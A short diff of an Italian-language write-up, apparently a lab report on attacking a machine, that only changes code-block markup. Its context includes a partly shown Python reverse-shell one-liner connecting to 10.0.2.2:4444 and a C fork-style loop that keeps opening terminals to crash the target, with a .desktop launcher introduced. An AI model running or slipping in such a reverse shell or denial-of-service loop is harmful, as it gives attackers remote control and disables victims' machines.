@@ -14,7 +14,7 @@ export RHOST="10.0.2.2";export RPORT=4444;python3 -c 'import socket,os,pty;s=soc
 </pre>
 che permette di creare una reverse shell in background quando eseguito sulla macchina attaccata.
 Poi, è stato creato un semplicissimo programma in C, `dos.c`, contenente un ciclo while infinito che continua ad aprire finestre di terminale:
-<pre>
+```js
 #include <stdlib.h>
 int main(){
     while(1){
@@ -22,7 +22,7 @@ int main(){
     }
     return 0;
 }
-</pre>
+```
 è stato scelto di aprire il terminale per semplicità, è possibile farlo con altre applicazioni e anche aprirne diverse, creando un vero e proprio crash della macchina. 
 Infine è stato creato il file `dos.desktop` 
 <pre>
